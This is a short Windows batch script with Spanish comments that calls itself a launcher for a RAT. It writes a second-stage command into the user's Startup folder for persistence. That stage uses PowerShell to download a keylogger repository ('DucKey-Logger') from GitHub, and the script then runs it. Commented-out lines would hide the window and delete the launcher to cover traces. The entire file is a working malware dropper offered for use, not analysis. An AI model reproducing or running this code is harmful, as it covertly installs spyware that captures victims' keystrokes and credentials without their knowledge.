@echo off
@REM Launcher para el RAT

@REM Variables
@REM Locación inicial
set "INITIALPATH=%cd%"
@REM definr directorio inicio de programas.
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM Dirigirse al direcrotio del inicio de windows.
cd  %STARTUP% 

@REM Ejecutar payloads al inicio.
(
	echo powershell -c "Invoke-WebRequest -Uri 'https://codeload.github.com/PrettyBoyCosmo/DucKey-Logger/zip/refs/heads/main' -OutFile 'fuckyou.zip'"
) > stage2.cmd

@REM corriendo el payload
@REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
powershell ./stage2.cmd
 pause 

@REM cd hacia la locacion inicial
cd %INITIALPATH%

@REM Borramos el iniciador
@REM DEL "initial.cmd"